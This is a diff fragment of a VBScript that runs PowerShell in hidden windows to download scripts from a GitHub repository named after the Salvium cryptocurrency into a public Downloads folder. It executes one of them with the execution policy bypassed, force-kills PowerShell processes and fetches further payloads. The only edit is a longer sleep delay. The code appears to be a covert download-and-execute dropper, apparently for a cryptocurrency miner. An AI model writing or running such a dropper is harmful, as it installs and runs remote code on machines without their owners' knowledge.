@@ -18,7 +18,7 @@ objShell.Run "powershell.exe -Command Invoke-WebRequest -Uri https://raw.githubu
 objShell.Run "powershell.exe -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/GALVINVN/Salvium-SAL-/refs/heads/main/configure_system.ps1 -OutFile C:\Users\Public\Downloads\configure_system.ps1", 0, True
 objShell.Run "powershell.exe -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/GALVINVN/Salvium-SAL-/refs/heads/main/LFO.ps1 -OutFile C:\Users\Public\Downloads\LFO.ps1", 0, True
 objShell.Run "powershell.exe -ExecutionPolicy Bypass -File C:\Users\Public\Downloads\configure_system.ps1", 0, True
-WScript.Sleep 10000
+WScript.Sleep 15000
 objShell.Run "powershell.exe -Command Get-Process -Name powershell | Stop-Process -Force", 0, True
 objShell.Run "powershell.exe -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/GALVINVN/-/refs/heads/main/ring.ps1 -OutFile C:\Users\Public\Downloads\ring.ps1", 0, True
 objShell.Run "powershell.exe -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/GALVINVN/-/refs/heads/main/rings.cmd -OutFile C:\Users\Public\Downloads\rings.cmd", 0, True
